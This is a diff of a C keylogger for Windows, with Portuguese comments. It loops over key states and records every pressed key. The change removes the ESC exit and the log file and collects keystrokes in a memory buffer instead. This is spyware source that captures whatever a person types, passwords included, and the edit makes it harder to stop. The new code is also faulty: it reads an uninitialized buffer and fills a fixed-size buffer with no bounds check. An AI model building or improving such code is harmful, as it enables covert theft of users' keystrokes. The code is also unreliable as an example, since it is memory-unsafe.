@@ -6,16 +6,8 @@
 
 int main() {
     short keyState;
-    FILE *file;
-
-    file = fopen("log.txt", "a+");
-
-    if (file == NULL) {
-        printf("Não foi possível abrir o arquivo.\n");
-        return 1;
-    }
-
-    printf("Pressione ESC para sair...\n");
+    char buffer[BUFFER_SIZE];
+     size_t len = strlen(buffer);
 
     while (1) {
         // Loop através das teclas
@@ -24,35 +16,39 @@ int main() {
 
             // Verifica se a tecla foi pressionada
             if (keyState & 0x0001) {
-                if (key == VK_ESCAPE) {
-                     // Sai do programa se ESC for pressionado
-                    fclose(file);
-                    return 0;
-                }
+                
 
-                // Grava a tecla no arquivo
                 if (key >= 'A' && key <= 'Z') {
-                    fprintf(file, "%c", key);
-                } else {
+                    
+                    buffer[len++] = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
+                    buffer[len] = '\0';
+
+                } 
+                
+                else {
                     switch (key) {
                         case VK_SPACE:
-                            fprintf(file, " ");
+                            buffer[len++] = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
+                            buffer[len] = '\0';
                             break;
                         case VK_RETURN:
-                            fprintf(file, "\n");
+                            buffer[len++] = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
+                            buffer[len] = '\0';
                             break;
                         case VK_TAB:
-                            fprintf(file, "\t");
+                            buffer[len++] = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
+                            buffer[len] = '\0';
                             break;
                         default:
-                            fprintf(file, "[%d]", key);
+                            buffer[len++] = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
+                            buffer[len] = '\0';
                     }
                 }
 
-                fflush(file);  // Garante que os dados sejam escritos no arquivo
+               
             }
         }
 
-        Sleep(10); // Evita sobrecarrega da CPU
+        Sleep(20); // Evita sobrecarrega da CPU
     }
 }
